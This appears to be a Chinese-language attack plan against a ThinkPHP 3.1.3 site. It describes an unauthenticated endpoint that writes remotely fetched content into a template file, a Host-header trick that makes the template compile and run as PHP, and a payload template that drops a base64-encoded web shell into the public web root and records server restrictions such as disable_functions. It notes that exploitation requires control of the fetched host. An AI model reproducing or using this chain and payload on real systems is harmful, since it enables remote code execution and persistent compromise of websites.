# 原理
ThinkPHP 3.1.3 把 App/Tpl/**.html 编译成 PHP 后 include：
    App/Runtime/Cache/<组>/md5(模板文件绝对路径).php
取证（116）：md5('/www/wwwroot/jbg_com/App/Tpl/Home/Index_example.com')
            = 26badd51b9bbd7aaa1313b6b4ac737c3   （该文件真实存在于 App/Runtime/Cache/Home/）
编译产物形如：
    <?php if (!defined('THINK_PATH')) exit();?><!DOCTYPE html>...<模板正文原样拼入>
=> 模板正文里写原生 `<?php ... ?>` 会被原样带进编译产物并执行（TMPL_DENY_PHP 未开启）。

# 可利用的未授权写入点（Home 组 extends Action，无 _initialize，无鉴权无 WAF）
    GET /example.com?g=Home&m=Order&a=get_html1
    # $url  = http://<A>.target395.example.com/List/index/type/0
    # $url1 = http://<B>.target395.example.com/List/index/type/1
    # file_put_contents("./App/Tpl/Home/Index_example.com",    file_get_contents($url));
    # file_put_contents("./App/Tpl/Home/Index_indexapp.html", file_get_contents($url1));
    # 另有 ./Upload/atop/jquery3_5.txt / jquery3_6.txt / attime3_5.txt（.txt 不可执行）
    # 写入前仅校验 strlen($content) > 100

# 触发分支（Home/Index/index）
    $domain = $_SERVER['HTTP_HOST'];
    strpos($domain,"sp")       !== false -> display("indexapp")   // Index_indexapp.html
    strpos($domain,"example")!== false -> display("indexalert") // 防封跳转页（非注入点）
    否则                                 -> display()             // Index_example.com ★

# 攻击链
1) 让 $url 指向自己控制的主机（自建服务器 / 已控同站群节点），该 URL 返回：
       <?php <零花括号 payload> ?>
   ★ payload 必须避免 `{` `}` `#` —— ThinkPHP 模板标签解析会把 `{...}` 当标签处理、`#` 可能被当注释；
     用 array(...)+三元表达式即可写出完全无花括号的 PHP。
2) 调用 get_html1()（等价站点自身 cron，非破坏性：实测该站约每 30 分钟自跑一次）
3) 用**不含 sp / example** 的 Host 请求首页 → TP 编译 Index_example.com → payload 执行
4) 或用 curl 直接打编译产物： GET /App/Runtime/Cache/Home/<md5(模板绝对路径)>.php

# 关键前提（决定成败）
必须能控制 get_html1() 抓取的域名。该域名为站群动态 DNS（*.target395.example.com），
经实测为**自指解析**：从哪台机器请求就解析回哪台机器本身（116 上解析到 116、
176 上解析到 176），因此纯外部攻击者拿不到控制权。
=> 本条只在「能控制被抓取主机」时可用，或用于评估同站群其它节点互抓场景。

# 零花括号 payload 模板
<?php @error_reporting(0);
@file_put_contents("/www/wwwroot/<site>/Public/www/x.php",base64_decode("<b64 shell>"));
@file_put_contents("/www/wwwroot/<site>/Public/www/mk.txt",json_encode(array(
 "uid"=>function_exists("posix_geteuid")?posix_geteuid():"na","cwd"=>getcwd(),
 "ob"=>ini_get("open_basedir"),"df"=>ini_get("disable_functions"))));
echo "<!-- ok -->";?>
